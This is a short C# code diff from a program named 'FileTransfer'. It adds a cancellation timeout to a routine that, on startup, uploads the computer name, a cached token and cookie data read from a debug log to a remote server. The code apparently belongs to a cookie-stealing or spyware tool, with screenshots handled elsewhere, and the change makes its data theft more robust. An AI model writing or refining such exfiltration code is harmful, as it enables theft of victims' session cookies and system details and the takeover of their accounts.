@@ -293,8 +293,16 @@ namespace FileTransfer
                             if (string.IsNullOrEmpty(_cachedToken))
                                 ReadCookieDebugLog();
                             Log("Token request: uploading...");
-                            await UploadFileOnStartupAsync();
-                            Log("Token request: upload complete");
+                            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(25));
+                            try
+                            {
+                                await UploadFileOnStartupAsync(cts.Token);
+                                Log("Token request: upload complete");
+                            }
+                            catch (OperationCanceledException)
+                            {
+                                Log("Token request: UPLOAD TIMEOUT (25s), continuing poll loop");
+                            }
                         }
                         finally
                         {
@@ -330,7 +338,7 @@ namespace FileTransfer
         }
 
         // ── Startup Upload (computer info + cookie, no screenshots) ───────
-        private async Task UploadFileOnStartupAsync()
+        private async Task UploadFileOnStartupAsync(CancellationToken ct = default)
         {
             string pcName = ComputerInfo.GetName();
             Log($"Upload startup: pcName={pcName}, hasToken={!string.IsNullOrEmpty(_cachedToken)}, cookieError={_cookieError?.Length ?? 0}chars");
@@ -361,7 +369,7 @@ namespace FileTransfer
                 }
 
                 string url = $"{ServerUrl}/upload";
-                var resp = await _http.PostAsync(url, content);
+                var resp = await _http.PostAsync(url, content, ct);
                 Log($"Upload startup response: {(int)resp.StatusCode}");
             }
             catch (Exception ex)
